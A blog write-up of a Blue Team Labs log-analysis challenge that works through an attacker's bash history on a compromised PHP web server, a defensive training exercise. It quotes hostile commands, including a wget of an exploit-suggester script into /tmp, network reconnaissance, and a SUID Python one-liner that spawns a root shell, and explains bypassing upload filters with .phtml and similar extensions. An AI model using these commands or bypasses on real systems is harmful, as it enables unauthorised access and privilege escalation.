---
layout: post
title:  "BTLO | Log Analysis - Privilege Escalation"
date:   2021-10-16 05:36:00
tags: [Security, BlueTeamLabs, Cyber Defense]
style: border
color: primary
description: "Blue Team Labs: Log Analysis - Privilege Escalation Writeup"
---

This is my write-up for [Log Analysis - Privilege Escalation](https://blueteamlabs.online/home/challenge/4) on Blue Team Labs.

**P.S: I highly encourage you to try solving the challenges on your own first then check this writeup if you are stuck.**

**Scenario**

>A server with sensitive data was accessed by an attacker and the files were posted on an underground forum. This data was only available to a privileged user, in this case, the ‘root’ account. Responders say ‘www-data’ would be the logged-in user if the server was remotely accessed, and this user doesn’t have access to the data. The developer stated that the server is hosting a PHP-based website and that proper filtering is in place to prevent PHP file uploads to gain malicious code execution. The bash history is provided to you but the recorded commands don’t appear to be related to the attack. Can you find what actually happened?

To solve this challenge we are required to download the task file, extract the zip file using the password provided, and analyze the file. 


## **Q.** What user (other than ‘root’) is present on the server?
**A.** daniel

On most Linux systems non-system users have a folder created for them under the home directory. The nomenclature is as follows:

`/home/usernamehere`

Searching for “home” in this log shows that line 21 contains the username from this server.

```console
...
cd /home
ls
cd /home/daniel/
ls -la
su root
...
```
{: file='bash_history'}

## **Q.** What script did the attacker try to download to the server?
**A.** linux-exploit-suggester.sh

The malicious actor tried to download a malicious script from a GitHub URL using the wget command, in line 32.

```console
...
echo os.system('/bin/bash')
cd /tmp
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
env
ps -aux
...
```
{: file='bash_history'}

## **Q.** What packet analyzer tool did the attacker try to use?
**A.** tcpdump

Previous knowledge of common packet analyzers helps with finding this answer. Line 41 to line 47 shows that the malicious actor attempted to gather information about the host's network connections and common network configuration files.

```console
...
ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
cat /etc/resolv.conf
iptables -L
lsof -i
tcpdump
...
```
{: file='bash_history'}

## **Q.** What file extension did the attacker use to bypass the file upload filter implemented by the developer?
**A.** .phtml

Previous knowledge on upload vulnerabilities helps with discerning what's happening here. Unfortunately, we are unable to view the upload allow/deny configurations. That said, common file extensions are found in some commands. Line 63 shows that a .phtml file in the uploads directory under /var/www/html was removed.

A common security feature of web filters is examining a file extension to include or exclude for upload forms. One such extension that is commonly blocked is `.php` due to the nature of potentially enabling a malicious actor to upload a web shell. 

We can't tell for sure but intuitively files with the `.php` extension seem to not be allowed by the upload form. In this case, the malicious actor simply can change the file extension from `.php` to `.phtml` to bypass the exclusions. The `.phtml` file extension can execute PHP code just like a PHP file would but it is often overlooked or mistakenly left out of the exclusion list. The same goes for other PHP file extensions such as: 

- .php3
- .php4
- .php5


```console
...
rm /var/www/html/uploads/x.phtml
```
{: file='bash_history'}

## **Q.** Based on the commands run by the attacker before removing the PHP shell, what misconfiguration was exploited in the ‘python’ binary to gain root-level access? 1- Reverse Shell ; 2- File Upload ; 3- File Write ; 4- SUID ; 5- Library load 
**A.** 4

Python is directly referenced in lines 26, 27, and 62 in what seems like privilege escalation attempts. 

Line 27 shows that python was used to spawn a shell in bin/sh/. 
Line 62 shows that python was used to create a shell. 

There seems to be a SUID permissions misconfiguration on the victim host.

SUID stands for “SetUID”. It is a Linux permissions flag that allows users to run that particular executable as the executable's owner. For example, if a file is owned by root, the program will always run as root, regardless of who started the execution.

This is a common way a malicious actor performs privilege escalation on a system.

```console
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
{: file='bash_history'}